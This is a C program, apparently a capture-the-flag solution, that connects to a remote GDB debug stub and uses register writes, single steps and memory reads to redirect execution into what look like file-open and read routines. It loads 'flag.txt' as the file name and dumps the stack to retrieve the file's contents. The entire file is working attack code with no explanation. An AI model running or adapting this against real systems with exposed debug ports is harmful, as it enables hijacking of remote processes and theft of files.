#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define VAL2ASC "0123456789abcdef"

int error_exit(char *str)
{
  fprintf(stderr, "%s\n", str);
  exit(1);
}

int send_command(int s, char *buffer)
{
  int i;
  unsigned char c, sum = 0;

  *(buffer - 1) = '$';
  for (i = 0; buffer[i]; i++) {
    sum += buffer[i];
  }

  buffer[i    ] = '#';
  buffer[i + 1] = VAL2ASC[(sum >> 4) & 0xf];
  buffer[i + 2] = VAL2ASC[ sum       & 0xf];

  write(1, buffer, i);
  write(1, "\n", 1);

  write(s, buffer - 1, i + 4);
  read(s, &c, 1);

  return i;
}

int recv_command(int s, char *buffer, int size)
{
  int r, offset = 0, start = 0;
  unsigned char c;

  while (1) {
    r = read(s, &c, 1);
    if (r <= 0)
      error_exit("connection error.");
    if (offset == size)
      error_exit("small buffer.");

    if (!start) {
      if (c == '$')
	start = 1;
      continue;
    }

    buffer[offset++] = c;
    if ((offset > 2) && (buffer[offset - 3] == '#'))
      break;
  }

  write(s, "+", 1);
  write(1, buffer, offset - 3);
  write(1, "\n", 1);

  return offset - 3;
}

int command(int s, char *buffer, int size)
{
  send_command(s, buffer);
  return recv_command(s, buffer, size);
}

uint32_t read_be_value(char *buffer, int size)
{
  uint32_t val = 0;
  char str[2];
  int i;

  for (i = 0; i < size * 2; i++) {
    str[0] = buffer[i];
    str[1] = '\0';
    val <<= 4;
    val |= strtoul(str, NULL, 16);
  }

  return val;
}

uint32_t write_be_value(char *buffer, int size, uint32_t val)
{
  int i;

  for (i = 0; i < size * 2; i++) {
    buffer[i] = VAL2ASC[(val >> ((size * 2 - 1 - i) * 4)) & 0xf];
  }

  return val;
}

uint32_t get_rn_from_g(char *buffer, int n)
{
  return read_be_value(buffer + 8 * n, 4);
}

uint32_t get_sp_from_g(char *buffer)
{
  return get_rn_from_g(buffer, 7);
}

uint32_t get_pc_from_g(char *buffer)
{
  return get_rn_from_g(buffer, 9);
}

uint32_t set_rn_to_G(char *buffer, int n, uint32_t val)
{
  return write_be_value(buffer + 8 * n, 4, val);
}

uint32_t set_sp_to_G(char *buffer, uint32_t val)
{
  return set_rn_to_G(buffer, 7, val);
}

uint32_t set_pc_to_G(char *buffer, uint32_t val)
{
  return set_rn_to_G(buffer, 9, val);
}

int connect_socket(char *hostname, int port)
{
  int s;
  struct hostent *host;
  struct sockaddr_in addr;
  socklen_t addrlen;

  host = gethostbyname(hostname);
  if (host == NULL)
    error_exit("gethostbyname() failed.");

  s = socket(PF_INET, SOCK_STREAM, 0);
  if (s < 0)
    error_exit("socket() failed.");

  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  memcpy(&addr.sin_addr, host->h_addr, host->h_length);
  addrlen = sizeof(addr);

  if (connect(s, (struct sockaddr *)&addr, addrlen) < 0)
    error_exit("connect() failed.");

  return s;
}

#define BUFSIZE (1024 * 64)
#define BUFMARGIN 16

int main(int argc, char *argv[])
{
  int s, size;
  static char buffer[BUFSIZE + BUFMARGIN];
  char *p;
  uint32_t pc, sp;

  if (argc < 3)
    error_exit("less options.");

  s = connect_socket(argv[1], atoi(argv[2]));

  p = buffer + BUFMARGIN;

  /* Receive first command and send ACK */
  recv_command(s, p, BUFSIZE);

  /* Set registers */
  memset(p, 0, BUFSIZE);
  sprintf(p, "g");
  size = command(s, p, BUFSIZE);
  pc = get_pc_from_g(p);
  printf("PC: 0x%08x\n", pc);
  *(p - 1) = 'G';
  p[size] = '\0';
  set_rn_to_G(p, 6, 0x0);
  set_rn_to_G(p, 5, ('.' << 24) | ('t' << 16) | ('x' << 8) | 't');
  set_rn_to_G(p, 4, ('f' << 24) | ('l' << 16) | ('a' << 8) | 'g');
  set_pc_to_G(p, 0x000632);
  command(s, p - 1, BUFSIZE + 1);

  /* Skip */
  sprintf(p, "s"); command(s, p, BUFSIZE);
  sprintf(p, "s"); command(s, p, BUFSIZE);
  sprintf(p, "s"); command(s, p, BUFSIZE);

  /* Get stack pointer */
  sprintf(p, "g");
  command(s, p, BUFSIZE);
  sp = get_sp_from_g(p);
  printf("SP: 0x%08x\n", sp);
  sprintf(p, "m%x,16", sp);
  command(s, p, BUFSIZE);

  /* Set registers */
  memset(p, 0, BUFSIZE);
  sprintf(p, "g");
  size = command(s, p, BUFSIZE);
  pc = get_pc_from_g(p);
  printf("PC: 0x%08x\n", pc);
  *(p - 1) = 'G';
  p[size] = '\0';
  set_rn_to_G(p, 0, sp);
  set_rn_to_G(p, 1, 0);
  set_rn_to_G(p, 2, 0);
  set_pc_to_G(p, 0x0013b6);
  command(s, p - 1, BUFSIZE + 1);

  /* Skip */
  sprintf(p, "s"); command(s, p, BUFSIZE);
  sprintf(p, "s"); command(s, p, BUFSIZE);
  sprintf(p, "s"); command(s, p, BUFSIZE);
  sprintf(p, "s"); command(s, p, BUFSIZE);
  sprintf(p, "s"); command(s, p, BUFSIZE);

  /* Set registers */
  memset(p, 0, BUFSIZE);
  sprintf(p, "g");
  size = command(s, p, BUFSIZE);
  pc = get_pc_from_g(p);
  printf("PC: 0x%08x\n", pc);
  *(p - 1) = 'G';
  p[size] = '\0';
  set_rn_to_G(p, 1, sp);
  set_rn_to_G(p, 2, 32);
  set_pc_to_G(p, 0x0013aa);
  command(s, p - 1, BUFSIZE + 1);

  /* Skip */
  sprintf(p, "s"); command(s, p, BUFSIZE);

  /* Dump stack */
  sprintf(p, "m%x,32", sp);
  command(s, p, BUFSIZE);

  sprintf(p, "D");
  command(s, p, BUFSIZE);

  return 0;
}
